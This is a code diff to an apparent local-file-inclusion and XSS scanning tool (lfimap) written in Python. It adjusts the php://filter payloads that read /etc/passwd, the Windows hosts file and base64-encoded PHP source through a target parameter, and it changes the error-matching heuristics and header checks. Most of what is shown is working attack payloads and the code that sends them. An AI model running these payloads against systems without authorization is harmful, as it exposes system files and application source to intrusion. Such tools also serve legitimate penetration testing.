@@ -320,7 +320,7 @@ def test_xss(url):
             for item in matcher:
                 if(item in res.text):
                     if(args.postreq): print("[+] XSS -> '" + u + "' -> HTTP POST -> '" + args.postreq.replace(args.param, line) + "'")
-                    else: print("[+] XSS -> '" + u + "'")
+                    else: print("[+] Unsanitized reflection, possible XSS -> '" + u + "'")
                     if(not args.no_stop):
                         return
     return
@@ -336,14 +336,11 @@ def test_filter(url):
     tests.append("php://filter/resource=/etc/passwd%00")
     tests.append("php://filter/convert.base64-encode/resource=/etc/passwd")
     tests.append("php://filter/convert.base64-encode/resource=/etc/passwd%00")
-    tests.append("php://filter/read=string.rot13/resource=/etc/passwd")
-    tests.append("php://filter/read=string.rot13/resource=/etc/passwd%00")
         
     tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts")
     tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts%00")
     tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts") 
     tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts%00") 
-    tests.append("php://filter/resource=%25windir%25%5CSystem32%5Cdrivers%5Cetc%5Chosts")
     
     script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
     scriptName = script[0]
@@ -351,11 +348,11 @@ def test_filter(url):
     #If '/?=' in url
     if(scriptName == ""):
         scriptName = "index"
-
+    
     tests.append("php://filter/convert.base64-encode/resource=" + scriptName)
     tests.append("php://filter/convert.base64-encode/resource=" + scriptName + ".php")
     tests.append("php://filter/convert.base64-encode/resource=" + scriptName + "%00")
-
+    
     if(not args.postreq):
         for i in range(len(tests)):
             if(args.param in url):
@@ -527,7 +524,7 @@ def test_heuristics(url):
     tests = []
     tests.append("/?!%$$%!?/")
     
-    errors = ["Warning", "include_path"]
+    errors = ["Warning", "include(", "require(", "fopen(", "fpassthru(", "readfile(", "fread(", "fgets("]
     temp = headers.copy()
     temp['User-Agent'] = "lfimap<>ua"
     temp['Referer'] = "lfimap<>referer"
@@ -537,25 +534,31 @@ def test_heuristics(url):
         for test in tests:
             u = url.replace(args.param, test)
             res = requests.get(u,  headers = temp, proxies = proxies)
-            if(errors[0] in res.text and errors[1] in res.text):
-                if("C:" in res.text or "D:" in res.text or "windows" in res.text.lower()):
-                    print("[i] Detected windows OS signatures, based on response.")
-                print("[+] Possible LFI ->  error triggered -> '" + u + "'")
+            if(errors[0] in res.text):
+                for i in range(1,len(errors)):
+                    if(errors[i] in res.text):
+                        if("C:" in res.text or "D:" in res.text or "windows" in res.text.lower()):
+                            print("[i] Detected windows OS signatures, based on response.")
+                        print("[+] Possible LFI ->  error triggered -> '" + u + "'")
+                        break
     else:
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
             res = requests.post(url, headers = temp, data = postTest, proxies = proxies)
             
-            if(errors[0] in res.text and errors[1] in res.text):
-                if("/php" in res.text):
-                    print("[i] Detected linux OS signatures, based on response.")
-                print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
-        
+            if(errors[0] in res.text):
+                for i in range(1, len(errors)):
+                    if(errors[i] in res.text):
+                        if("/php" in res.text):
+                            print("[i] Detected linux OS signatures, based on response.")
+                        print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
+                        break
+
     if("Server" in res.headers):
         print("[+] Possible web server version disclosure: " + res.headers['Server'])
     
     resHeaders = "".join(res.headers).lower()
-    if("x-Powered-by" in resHeaders):
+    if("x-powered-by" in resHeaders):
         print("[+] Possible disclosure of underlying web server languages discovered: " + res.headers['X-Powered-By'])
     if("phpsessid" in resHeaders):  
         print("[+] Discovered possible PHP signatures.")
